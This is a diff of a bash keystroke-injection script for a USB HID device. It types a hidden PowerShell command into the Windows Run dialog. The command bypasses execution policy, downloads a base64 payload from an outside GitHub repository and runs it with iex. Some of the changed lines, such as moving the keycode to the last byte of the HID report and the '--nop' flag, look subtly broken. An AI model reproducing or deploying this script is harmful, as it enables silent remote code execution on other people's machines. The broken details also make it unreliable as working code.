@@ -18,7 +18,7 @@ declare -A KEYCODES=(
   [8]="25" [9]="26"
   [" "]="2C" ["."]="37" [","]="36" ["\n"]="28" ["\r"]="28" ["/"]="38"
   ["@"]="34"  # UK @ is different from US
-  ["+"]="57" ["="]="2E" [":"]="33" ["\""]="34"  # double quote shares code with @ here
+  ["+"]="57" ["="]="2E" [":"]="33" ["\""]="1F"  # double quote shares code with @ here
   ["\\"]="64"  # backslash is different scancode
   ["-"]="2D"
   ["'"]="35"
@@ -44,10 +44,10 @@ declare -A MODIFIERS=(
 
 send_key() {
   # $1 = modifier, $2 = keycode
-  printf "\\x$1\\x00\\x$2\\x00\\x00\\x00\\x00\\x00" > $HID_DEV
-  sleep 0.01
+  printf "\\x$1\\x00\\x00\\x00\\x00\\x00\\x00\\x$2" > $HID_DEV
+  sleep 0.005
   printf "\x00\x00\x00\x00\x00\x00\x00\x00" > $HID_DEV
-  sleep 0.01
+  sleep 0.005
 }
 
 send_string() {
@@ -69,14 +69,14 @@ send_string() {
 }
 
 # Construct the PowerShell command that decodes and executes base64 silently
-POWERSHELL_CMD="powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
+POWERSHELL_CMD="powershell.exe -win Hidden --nop -ep Bypass -Command \"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/OrangeHatHacking/payloads/main/payload.b64'))))\""
 
 # Start injecting
 sleep 3
 
 # Press Win+R to open Run dialog
 send_key "08" "15"
-sleep 1
+sleep 0.5
 
 # Send the PowerShell command
 send_string "$POWERSHELL_CMD"
